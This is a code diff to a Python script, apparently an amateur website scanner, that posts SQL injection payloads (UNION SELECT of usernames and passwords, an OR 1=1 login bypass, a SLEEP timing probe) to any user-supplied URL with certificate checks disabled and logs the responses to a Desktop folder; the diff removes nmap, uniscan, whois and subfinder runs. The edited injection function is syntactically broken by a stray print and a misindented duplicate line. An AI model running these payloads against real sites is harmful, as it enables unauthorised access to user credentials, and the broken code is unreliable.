@@ -2,6 +2,7 @@ import os
 import subprocess
 import requests
 from requests.exceptions import RequestException, SSLError
+from datetime import datetime
 
 def run_command(command):
     """Run a command and return its output."""
@@ -99,7 +100,8 @@ def perform_sql_injection(target_url):
         "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;",
         "SELECT * FROM users WHERE username='user_input' AND password='password_input';",
         "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';",
-                "SELECT * FROM products WHERE name LIKE '%admin%' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1;",
+        "SELECT * FROM products WHERE name LIKE '%user_input%';",
+        "SELECT * FROM products WHERE name LIKE '%admin%' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1;",
         "SELECT * FROM products WHERE name LIKE '%user_input%';",
         "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
     ]
@@ -113,82 +115,59 @@ def perform_sql_injection(target_url):
         try:
             response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
             if "error" in response.text.lower():
-                print(f"Payload: {payload} might cause an error")
+                print
+                            if "error" in response.text.lower():
+                result = f"Payload: {payload} might cause an error"
             else:
-                print(f"Payload: {payload} - Response: {response.text}")  # This will display the extracted data
+                result = f"Payload: {payload} - Response: {response.text}"
+            save_to_file(output_file, result)  # Save the results in the file
         except SSLError as e:
-            print(f"SSL Error: {e}")
+            result = f"SSL Error: {e}"
+            save_to_file(output_file, result)  # Save the error message in the file
         except RequestException as e:
-            print(f"Request Error: {e}")
+            result = f"Request Error: {e}"
+            save_to_file(output_file, result)  # Save the error message in the file
+
+def create_results_directory():
+    """Create a results directory on the Desktop with a timestamp."""
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    results_dir = os.path.join(desktop_path, f"ScanResults_{timestamp}")
+    os.makedirs(results_dir, exist_ok=True)
+    return results_dir
 
 def main():
-    # Print the header
+    """Main function to execute the scanning process."""
+    clear_screen()
     print_header()
-
-    # Create a directory for the results
-    results_dir = "scan_results"
-    if not os.path.exists(results_dir):
-        os.makedirs(results_dir)
-
-    # Get target URL from the user
-    target_url = input("Enter the URL of the website to check: ").strip()
     
-    # Define results file path
-    results_file = os.path.join(results_dir, 'results.txt')
-
-    # Check if the target URL is accessible
-    if check_website_status(target_url):
-        # Perform SQL Injection tests
-        print("Performing SQL Injection tests...")
-        perform_sql_injection(target_url)
-        
-        # Save results to a file
-        print(f"Saving results to {results_file}...")
-        save_to_file(results_file, "SQL Injection test results:")
-        save_to_file(results_file, f"Target URL: {target_url}")
-
-        # Run uniscan
-        print("Running uniscan...")
-        stdout, stderr = run_command(["uniscan", "-u", target_url, "-qweds"])
-        save_to_file(results_file, "Uniscan output:")
-        save_to_file(results_file, stdout)
-        if stderr:
-            save_to_file(results_file, "Uniscan errors:")
-            save_to_file(results_file, stderr)
-        
-        # Run nmap scan
-        print("Running nmap scan...")
-        stdout, stderr = run_command(["nmap", "-sS", "-sV", "-T4", target_url])
-        save_to_file(results_file, "Nmap output:")
-        save_to_file(results_file, stdout)
-        if stderr:
-            save_to_file(results_file, "Nmap errors:")
-            save_to_file(results_file, stderr)
-
-        # Run whois lookup
-        print("Running whois lookup...")
-        stdout, stderr = run_command(["whois", target_url])
-        save_to_file(results_file, "Whois output:")
-        save_to_file(results_file, stdout)
-        if stderr:
-            save_to_file(results_file, "Whois errors:")
-            save_to_file(results_file, stderr)
-        
-        # Run subfinder
-        print("Running subfinder...")
-        stdout, stderr = run_command(["subfinder", "-d", target_url])
-        save_to_file(results_file, "Subfinder output:")
-        save_to_file(results_file, stdout)
-        if stderr:
-            save_to_file(results_file, "Subfinder errors:")
-            save_to_file(results_file, stderr)
-        
-        # Append scan completion message
-        save_to_file(results_file, "Scan completed by Haggar")
-
-        print(f"All results have been saved to {results_file}")
+    target_url = input("Enter the URL of the website to check: ")
+    
+    # Create results directory on the Desktop
+    results_dir = create_results_directory()
+    print(f"Results will be saved in: {results_dir}")
+    
+    # Check website status
+    if not check_website_status(target_url):
+        print("Website is not accessible. Exiting...")
+        return
+    
+    # Perform SQL Injection scan
+    print("Performing SQL Injection scan...")
+    global output_file
+    output_file = os.path.join(results_dir, "1_sql_injection_results.txt")
+    perform_sql_injection(target_url)
+    
+    # You can add other scan functions here if needed
+    
+    # Final message
+    print("Scan completed.")
+    with open(os.path.join(results_dir, "scan_summary.txt"), 'w') as f:
+        f.write("Scan completed by Haggar\n")
+    
+    print("Scan results saved. Check the 'ScanResults' folder on your Desktop.")
 
 if __name__ == "__main__":
-    install_tools()
-    clear_screen()
     main()
+        
+        
